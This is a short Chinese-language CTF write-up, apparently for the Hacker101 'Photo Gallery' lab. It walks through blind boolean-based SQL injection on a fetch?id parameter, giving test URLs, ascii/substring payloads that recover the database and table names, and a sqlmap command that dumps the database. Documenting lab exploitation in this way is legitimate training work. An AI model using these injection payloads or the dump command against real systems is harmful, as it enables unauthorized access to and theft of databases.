---
title: hacker101-photo gallery
date: 2019-07-04 10:50:55
tags: 
category: walkthrough
---
无回显的 Boolean 型 SQL 注入
<!-- more -->
# 测试
```
http://35.190.155.168/1a4eaa7b69/fetch?id=1 ==> 200
http://35.190.155.168/1a4eaa7b69/fetch?id=1' and 1=1-- ==> 500
http://35.190.155.168/1a4eaa7b69/fetch?id=1" and 1=1-- ==> 500
http://35.190.155.168/1a4eaa7b69/fetch?id=1 and 1=1-- ==> 200
http://35.190.155.168/1a4eaa7b69/fetch?id=1 and 1=2-- ==> 404
http://35.190.155.168/1a4eaa7b69/fetch?id=1 and LENGTH(database())=1 -- => 404
...
http://35.190.155.168/1a4eaa7b69/fetch?id=1 and LENGTH(database())=6 -- => 200

```

# 渗透
1. 找出当前表字段
```
http://35.190.155.168/1a4eaa7b69/fetch?id=1%20%20order%20by%201%23 => 200

and order by 1 #

当前表只有一个字段
```
2. 找出数据库名
```
select ascii(substring((select database()),[0-9],1))=[ascii码];
```

3. 找出表名
```
select table_name from information_schema.tables where table_schema="blog" limit 0,1 ; # 第一张表
select table_name from information_schema.tables where table_schema="blog" limit 1,1 ; # 第二张表
```

4. 找出用户名和密码
```
select ascii(substring((select user()),[0-9],1))=[ascii码];
```

# walkthrough 
## 直接使用 burp 进行测试,其请求的 url 构造如下
```
%20and%20(select%20ascii(substring((select%20database()),1,1)))=11--
```
![photo1](/postimg/photo1-1.PNG)
![photo1](/postimg/photo1-2.PNG)
![photo1](/postimg/photo1-3.PNG)
![photo1](/postimg/photo1-4.PNG)
![photo1](/postimg/photo1-5.PNG)

第一步结果得出数据库名为 `level5`

## 得出当前表名，其 url 构造如下
```
%20and%20(select%20ascii(substring((select table_name from information_schema.tables where table_schema="level5" limit 0,1),$_$,1)))=$_$ --
```

得出第一张的表名：albums

## 使用 sqlmap 进行渗透
```
python sqlmap.py -u http://35.227.24.107/bb66c5a931/fetch\?id\=2 -p id -o --random-agent -D level5 --dump --threads 10
```